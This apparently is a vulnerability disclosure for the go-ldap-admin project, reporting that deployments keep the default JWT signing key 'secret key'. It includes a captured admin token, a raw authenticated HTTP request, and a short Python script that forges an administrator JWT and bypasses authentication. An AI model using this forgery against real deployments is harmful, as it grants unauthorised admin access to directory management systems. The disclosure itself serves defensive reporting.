Similar to CVE-2025-30206\CVE-2024-11619\CVE-2024-52295
The software repository does not enforce the modification of the default JWT key, making it possible to forge it.

The usage process is as follows:

Configure locally using the official documentation.

https://ldapdoc.eryajf.net/pages/f081dc/#docker-compose%E9%9B%86%E6%88%90mysql


<img width="1613" height="852" alt="图片" src="https://github.com/user-attachments/assets/aa719e1b-0d99-410e-a769-10c49b15fb69" />

Deployment successful. Log in to view the generated JWT.

<img width="1500" height="563" alt="图片" src="https://github.com/user-attachments/assets/3485a3f9-f368-48b1-ad38-dbc5f4e3deb0" />



```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE4MDU2MTAzMTksImlkZW50aXR5IjoxLCJvcmlnX2lhdCI6MTc2MjQxMDMxOSwidXNlciI6IntcIklEXCI6MSxcIkNyZWF0ZWRBdFwiOlwiMjAyNS0xMS0wNlQxNDoyNDoxOC45MzgrMDg6MDBcIixcIlVwZGF0ZWRBdFwiOlwiMjAyNS0xMS0wNlQxNDoyNDoxOC45MzgrMDg6MDBcIixcIkRlbGV0ZWRBdFwiOm51bGwsXCJ1c2VybmFtZVwiOlwiYWRtaW5cIixcInBhc3N3b3JkXCI6XCJYaTk0a09jeEszODMvNEdPWE5TcUN0eVozWXJMZjJiNDFpZWgyVlZuemtBZ3ltVURkb1FPV05JZjA2bmdjSnROQWlYRHBFcDBVbGVvdWNFQjdSWFJVK28zYUlBQkcrSkhwK0pKN3lPUGYzMll0azBjdWdKZW1iZFZCbmJVWk8wWTREZGdlSkFhbTVUN3dIOWx5UzVCajJLaW1FZERyb2hiWU11Z3htSU1yWG89XCIsXCJuaWNrbmFtZVwiOlwi566h55CG5ZGYXCIsXCJnaXZlbk5hbWVcIjpcIuacgOW8uuWQjuWPsFwiLFwibWFpbFwiOlwiYWRtaW5AZXJ5YWpmLm5ldFwiLFwiam9iTnVtYmVyXCI6XCIwMDAwXCIsXCJtb2JpbGVcIjpcIjE4ODg4ODg4ODg4XCIsXCJhdmF0YXJcIjpcImh0dHBzOi8vd3BpbWcud2FsbHN0Y24uY29tL2Y3Nzg3MzhjLWU0ZjgtNDg3MC1iNjM0LTU2NzAzYjRhY2FmZS5naWZcIixcInBvc3RhbEFkZHJlc3NcIjpcIuWcsOeQg1wiLFwiZGVwYXJ0bWVudHNcIjpcIueglOWPkeS4reW_g1wiLFwicG9zaXRpb25cIjpcIuaJk-W3peS6ulwiLFwiaW50cm9kdWN0aW9uXCI6XCLmnIDlvLrlkI7lj7DnmoTnrqHnkIblkZhcIixcInN0YXR1c1wiOjEsXCJjcmVhdG9yXCI6XCLns7vnu59cIixcInNvdXJjZVwiOlwiXCIsXCJkZXBhcnRtZW50SWRcIjpcIlwiLFwicm9sZXNcIjpbe1wiSURcIjoxLFwiQ3JlYXRlZEF0XCI6XCIyMDI1LTExLTA2VDE0OjI0OjE4LjkwMyswODowMFwiLFwiVXBkYXRlZEF0XCI6XCIyMDI1LTExLTA2VDE0OjI0OjE4LjkwMyswODowMFwiLFwiRGVsZXRlZEF0XCI6bnVsbCxcIm5hbWVcIjpcIueuoeeQhuWRmFwiLFwia2V5d29yZFwiOlwiYWRtaW5cIixcInJlbWFya1wiOlwiXCIsXCJzdGF0dXNcIjoxLFwic29ydFwiOjEsXCJjcmVhdG9yXCI6XCLns7vnu59cIixcInVzZXJzXCI6bnVsbCxcIm1lbnVzXCI6bnVsbH1dLFwic291cmNlVXNlcklkXCI6XCJcIixcInNvdXJjZVVuaW9uSWRcIjpcIlwiLFwidXNlckRuXCI6XCJjbj1hZG1pbixkYz1lcnlhamYsZGM9bmV0XCIsXCJzeW5jU3RhdGVcIjoxfSJ9.TltSXC9s87IXCGpJ7V4Z3vqhv65Qc9VyAEIF9eE71J4
```


https://github.com/opsre/go-ldap-admin/blob/main/docs/docker-compose/docker-compose.yaml#L125

The default hardcoded JWT is  `secret key` .

<img width="1344" height="746" alt="图片" src="https://github.com/user-attachments/assets/0ed62582-3dd1-4a7f-b0b3-6b726e9d03d1" />

Verification revealed that our JWT key is also `secret key` .

<img width="1721" height="1256" alt="图片" src="https://github.com/user-attachments/assets/ff368e63-1a4d-4fd4-aa49-916314c68f89" />

This system uses the Authorization header for authentication, such as the following backend sensitive interfaces.



```HTTP
GET /api/log/operation/list?username=&ip=&path=&status=&pageNum=1&pageSize=10 HTTP/1.1
Host: 127.0.0.1:8888
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE4MDU2MTAzMTksImlkZW50aXR5IjoxLCJvcmlnX2lhdCI6MTc2MjQxMDMxOSwidXNlciI6IntcIklEXCI6MSxcIkNyZWF0ZWRBdFwiOlwiMjAyNS0xMS0wNlQxNDoyNDoxOC45MzgrMDg6MDBcIixcIlVwZGF0ZWRBdFwiOlwiMjAyNS0xMS0wNlQxNDoyNDoxOC45MzgrMDg6MDBcIixcIkRlbGV0ZWRBdFwiOm51bGwsXCJ1c2VybmFtZVwiOlwiYWRtaW5cIixcInBhc3N3b3JkXCI6XCJYaTk0a09jeEszODMvNEdPWE5TcUN0eVozWXJMZjJiNDFpZWgyVlZuemtBZ3ltVURkb1FPV05JZjA2bmdjSnROQWlYRHBFcDBVbGVvdWNFQjdSWFJVK28zYUlBQkcrSkhwK0pKN3lPUGYzMll0azBjdWdKZW1iZFZCbmJVWk8wWTREZGdlSkFhbTVUN3dIOWx5UzVCajJLaW1FZERyb2hiWU11Z3htSU1yWG89XCIsXCJuaWNrbmFtZVwiOlwi566h55CG5ZGYXCIsXCJnaXZlbk5hbWVcIjpcIuacgOW8uuWQjuWPsFwiLFwibWFpbFwiOlwiYWRtaW5AZXJ5YWpmLm5ldFwiLFwiam9iTnVtYmVyXCI6XCIwMDAwXCIsXCJtb2JpbGVcIjpcIjE4ODg4ODg4ODg4XCIsXCJhdmF0YXJcIjpcImh0dHBzOi8vd3BpbWcud2FsbHN0Y24uY29tL2Y3Nzg3MzhjLWU0ZjgtNDg3MC1iNjM0LTU2NzAzYjRhY2FmZS5naWZcIixcInBvc3RhbEFkZHJlc3NcIjpcIuWcsOeQg1wiLFwiZGVwYXJ0bWVudHNcIjpcIueglOWPkeS4reW_g1wiLFwicG9zaXRpb25cIjpcIuaJk-W3peS6ulwiLFwiaW50cm9kdWN0aW9uXCI6XCLmnIDlvLrlkI7lj7DnmoTnrqHnkIblkZhcIixcInN0YXR1c1wiOjEsXCJjcmVhdG9yXCI6XCLns7vnu59cIixcInNvdXJjZVwiOlwiXCIsXCJkZXBhcnRtZW50SWRcIjpcIlwiLFwicm9sZXNcIjpbe1wiSURcIjoxLFwiQ3JlYXRlZEF0XCI6XCIyMDI1LTExLTA2VDE0OjI0OjE4LjkwMyswODowMFwiLFwiVXBkYXRlZEF0XCI6XCIyMDI1LTExLTA2VDE0OjI0OjE4LjkwMyswODowMFwiLFwiRGVsZXRlZEF0XCI6bnVsbCxcIm5hbWVcIjpcIueuoeeQhuWRmFwiLFwia2V5d29yZFwiOlwiYWRtaW5cIixcInJlbWFya1wiOlwiXCIsXCJzdGF0dXNcIjoxLFwic29ydFwiOjEsXCJjcmVhdG9yXCI6XCLns7vnu59cIixcInVzZXJzXCI6bnVsbCxcIm1lbnVzXCI6bnVsbH1dLFwic291cmNlVXNlcklkXCI6XCJcIixcInNvdXJjZVVuaW9uSWRcIjpcIlwiLFwidXNlckRuXCI6XCJjbj1hZG1pbixkYz1lcnlhamYsZGM9bmV0XCIsXCJzeW5jU3RhdGVcIjoxfSJ9.TltSXC9s87IXCGpJ7V4Z3vqhv65Qc9VyAEIF9eE71J4
Connection: keep-alive
```

<img width="1525" height="652" alt="图片" src="https://github.com/user-attachments/assets/cc377810-ff12-416e-8c2c-df12fd2468aa" />

Deleting it will result in an authentication failure message.


<img width="1540" height="350" alt="图片" src="https://github.com/user-attachments/assets/3bf75258-3fa3-4a11-9325-e71638938f4d" />



Now that we know the default key, let's try to forge the JWT key. Our black-box testing of the JWT fields revealed that the JWT only verifies the ID value for users, and the administrator user's ID is 1 by default. Therefore, we can use a program to forge it.



```Python
import jwt
import json

def generate_jwt():
    secret = "secret key"  
    payload = {
        "exp": 1805610319,
        "identity": 1,
        "orig_iat": 1762410319,
        "user": json.dumps({"ID": 1})   
    }

    token = jwt.encode(payload, secret, algorithm="HS256")
    return token

if __name__ == "__main__":
    token = generate_jwt()
    print("JWT：")
    print(token)
```

Get jwt:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE4MDU2MTAzMTksImlkZW50aXR5IjoxLCJvcmlnX2lhdCI6MTc2MjQxMDMxOSwidXNlciI6IntcIklEXCI6IDF9In0.P34UPXVixE-J3TUSxcbPaSgTxg81fGAuUhsaOXUt5Jc
```

The forgery was successful; the user bypassed the authorization to access sensitive backend interfaces, allowing subsequent access to the backend and other sensitive operations.

<img width="1559" height="660" alt="图片" src="https://github.com/user-attachments/assets/e09b25bb-3545-4ce1-a40c-bb9094bc035a" />









